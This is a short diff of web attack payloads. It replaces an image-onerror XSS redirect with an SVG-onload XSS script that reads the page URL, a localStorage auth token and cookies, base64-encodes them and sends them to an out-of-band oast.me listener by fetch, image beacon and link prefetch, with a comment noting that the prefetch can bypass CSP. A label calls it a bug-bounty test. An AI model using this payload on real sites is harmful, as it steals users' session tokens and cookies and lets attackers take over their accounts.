@@ -1,1 +1,30 @@
-<img src=x onerror="location.host='https://check.' + location.hostname + '.14c82b02300fe8138b2bg15hbzhyyyyyf.oast.me'">
+<html><svg/onload="
+  (function(){
+    // Bug Bounty Test1234 1. Force HTTPS and define your listener
+    const server = 'https://14c82b02300fe8138b2bg15hbzhyyyyyf.oast.me/ssrf-test'; 
+    
+    // 2. Collect only high-value targets (keep it small)
+    const exfil = {
+        u: location.href,
+        t: localStorage.getItem('auth:token') || 'none',
+        c: document.cookie.substring(0, 500)
+    };
+    
+    // 3. Convert to Base64
+    const b64 = btoa(encodeURIComponent(JSON.stringify(exfil)));
+
+    // 4. Background Exfiltration (No Redirection)
+    // Method A: Fetch (Explicitly HTTPS)
+    fetch(server + '?v=1&d=' + b64, {mode:'no-cors', cache:'no-cache'});
+
+    // Method B: Image (Classic fallback, forced HTTPS)
+    const i = new Image();
+    i.src = server + '?v=2&d=' + b64;
+
+    // Method C: Link Prefetch (Often bypasses strict CSP)
+    const l = document.createElement('link');
+    l.rel = 'prefetch';
+    l.href = server + '?v=3&d=' + b64;
+    document.head.appendChild(l);
+  })();
+"></html>
